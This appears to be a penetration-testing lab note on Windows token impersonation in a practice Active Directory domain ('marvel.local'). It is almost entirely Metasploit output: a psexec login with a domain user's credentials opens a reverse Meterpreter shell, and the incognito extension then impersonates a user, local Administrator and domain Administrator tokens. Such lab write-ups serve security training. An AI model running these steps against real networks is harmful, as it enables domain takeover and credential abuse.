# Token Impersonation
```
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.0.2.7:4444 
[*] 10.0.2.4:445 - Connecting to the server...
[*] 10.0.2.4:445 - Authenticating to 10.0.2.4:445|marvel.local as user 'fcastle'...
[*] 10.0.2.4:445 - Selecting PowerShell target
[*] 10.0.2.4:445 - Executing the payload...
[+] 10.0.2.4:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (203846 bytes) to 10.0.2.4
[*] Meterpreter session 1 opened (10.0.2.7:4444 -> 10.0.2.4:58592) at 2024-12-28 10:07:41 -0500

meterpreter > 
```
Load incognito
```
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > 
```
List user tokens
```
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
MARVEL\fcastle
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1

Impersonation Tokens Available
========================================
No tokens available

meterpreter >
```
List group tokens
```
meterpreter > list_tokens -g

Delegation Tokens Available
========================================
\
\Authentication authority asserted identity
BUILTIN\Administrators
BUILTIN\Users
MARVEL\Domain Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\INTERACTIVE
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\LogonSessionId_0_106166
NT AUTHORITY\LogonSessionId_0_106746
NT AUTHORITY\LogonSessionId_0_109539
NT AUTHORITY\LogonSessionId_0_112963
NT AUTHORITY\LogonSessionId_0_116008
NT AUTHORITY\LogonSessionId_0_116061
NT AUTHORITY\LogonSessionId_0_118456
NT AUTHORITY\LogonSessionId_0_121674
NT AUTHORITY\LogonSessionId_0_124654
NT AUTHORITY\LogonSessionId_0_126818
NT AUTHORITY\LogonSessionId_0_130878
NT AUTHORITY\LogonSessionId_0_132934
NT AUTHORITY\LogonSessionId_0_133337
NT AUTHORITY\LogonSessionId_0_136544
NT AUTHORITY\LogonSessionId_0_136863
NT AUTHORITY\LogonSessionId_0_137186
NT AUTHORITY\LogonSessionId_0_137367
NT AUTHORITY\LogonSessionId_0_1447325
NT AUTHORITY\LogonSessionId_0_1490981
NT AUTHORITY\LogonSessionId_0_2040346
NT AUTHORITY\LogonSessionId_0_205946
NT AUTHORITY\LogonSessionId_0_2169237
NT AUTHORITY\LogonSessionId_0_229301
NT AUTHORITY\LogonSessionId_0_30322
NT AUTHORITY\LogonSessionId_0_30497
NT AUTHORITY\LogonSessionId_0_30528
NT AUTHORITY\LogonSessionId_0_34028
NT AUTHORITY\LogonSessionId_0_350217
NT AUTHORITY\LogonSessionId_0_351724
NT AUTHORITY\LogonSessionId_0_366578
NT AUTHORITY\LogonSessionId_0_384950
NT AUTHORITY\LogonSessionId_0_430708
NT AUTHORITY\LogonSessionId_0_469153
NT AUTHORITY\LogonSessionId_0_481832
NT AUTHORITY\LogonSessionId_0_493962
NT AUTHORITY\LogonSessionId_0_496838
NT AUTHORITY\LogonSessionId_0_50029
NT AUTHORITY\LogonSessionId_0_56125
NT AUTHORITY\LogonSessionId_0_56133
NT AUTHORITY\LogonSessionId_0_56191
NT AUTHORITY\LogonSessionId_0_56366
NT AUTHORITY\LogonSessionId_0_56808
NT AUTHORITY\LogonSessionId_0_58943
NT AUTHORITY\LogonSessionId_0_59229
NT AUTHORITY\LogonSessionId_0_594889
NT AUTHORITY\LogonSessionId_0_60229
NT AUTHORITY\LogonSessionId_0_60514
NT AUTHORITY\LogonSessionId_0_62225
NT AUTHORITY\LogonSessionId_0_662559
NT AUTHORITY\LogonSessionId_0_665730
NT AUTHORITY\LogonSessionId_0_66913
NT AUTHORITY\LogonSessionId_0_67553
NT AUTHORITY\LogonSessionId_0_67663
NT AUTHORITY\LogonSessionId_0_68659
NT AUTHORITY\LogonSessionId_0_71708
NT AUTHORITY\LogonSessionId_0_73571
NT AUTHORITY\LogonSessionId_0_73902
NT AUTHORITY\LogonSessionId_0_811037
NT AUTHORITY\LogonSessionId_0_812961
NT AUTHORITY\LogonSessionId_0_816770
NT AUTHORITY\LogonSessionId_0_84462
NT AUTHORITY\LogonSessionId_0_85733
NT AUTHORITY\LogonSessionId_0_88355
NT AUTHORITY\LogonSessionId_0_88741
NT AUTHORITY\LogonSessionId_0_89004
NT AUTHORITY\LogonSessionId_0_90712
NT AUTHORITY\LogonSessionId_0_90719
NT AUTHORITY\LogonSessionId_0_91479
NT AUTHORITY\LogonSessionId_0_98827
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT AUTHORITY\WRITE RESTRICTED
NT SERVICE\Appinfo
NT SERVICE\AudioEndpointBuilder
NT SERVICE\Audiosrv
NT SERVICE\BDESVC
NT SERVICE\BFE
NT SERVICE\BITS
NT SERVICE\BrokerInfrastructure
NT SERVICE\camsvc
NT SERVICE\CDPSvc
NT SERVICE\CoreMessagingRegistrar
NT SERVICE\CryptSvc
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DiagTrack
NT SERVICE\DispBrokerDesktopSvc
NT SERVICE\Dnscache
NT SERVICE\DPS
NT SERVICE\DusmSvc
NT SERVICE\EventLog
NT SERVICE\EventSystem
NT SERVICE\FontCache
NT SERVICE\gpsvc
NT SERVICE\IKEEXT
NT SERVICE\InstallService
NT SERVICE\InventorySvc
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\LanmanWorkstation
NT SERVICE\lfsvc
NT SERVICE\LicenseManager
NT SERVICE\lmhosts
NT SERVICE\LSM
NT SERVICE\mpssvc
NT SERVICE\NcbService
NT SERVICE\netprofm
NT SERVICE\NgcCtnrSvc
NT SERVICE\nsi
NT SERVICE\PcaSvc
NT SERVICE\PlugPlay
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\ProfSvc
NT SERVICE\RmSvc
NT SERVICE\RpcEptMapper
NT SERVICE\RpcSs
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\ShellHWDetection
NT SERVICE\Spooler
NT SERVICE\SSDPSRV
NT SERVICE\StateRepository
NT SERVICE\StorSvc
NT SERVICE\SysMain
NT SERVICE\SystemEventsBroker
NT SERVICE\TextInputManagementService
NT SERVICE\Themes
NT SERVICE\TimeBroker
NT SERVICE\TimeBrokerSvc
NT SERVICE\TokenBroker
NT SERVICE\TrkWks
NT SERVICE\UserManag
Impersonation Tokens Available
========================================
No tokens available

meterpreter > 
```
Impersonate MARVEL\fcastle
```
meterpreter > impersonate_token marvel\\fcastle
[+] Delegation token available
[+] Successfully impersonated user MARVEL\fcastle
meterpreter > shell
Process 7192 created.
Channel 2 created.
Microsoft Windows [Version 10.0.26100.2605]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\System32>whoami
whoami
marvel\fcastle

C:\Windows\System32>
```

```
meterpreter > rev2self
meterpreter > 

meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-2
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
PUNISHER\Administrator
Window Manager\DWM-2

Impersonation Tokens Available
========================================
No tokens available

meterpreter > 

meterpreter > impersonate_token punisher\\administrator
[+] Delegation token available
[+] Successfully impersonated user PUNISHER\Administrator
meterpreter > getuid
Server username: PUNISHER\Administrator
meterpreter >
```

```
meterpreter > rev2self
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-3
MARVEL\Administrator
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-3

Impersonation Tokens Available
========================================
No tokens available

meterpreter > 
```

```
meterpreter > impersonate_token marvel\\administrator
[+] Delegation token available
[+] Successfully impersonated user MARVEL\Administrator
meterpreter > getuid
Server username: MARVEL\administrator
meterpreter >
```
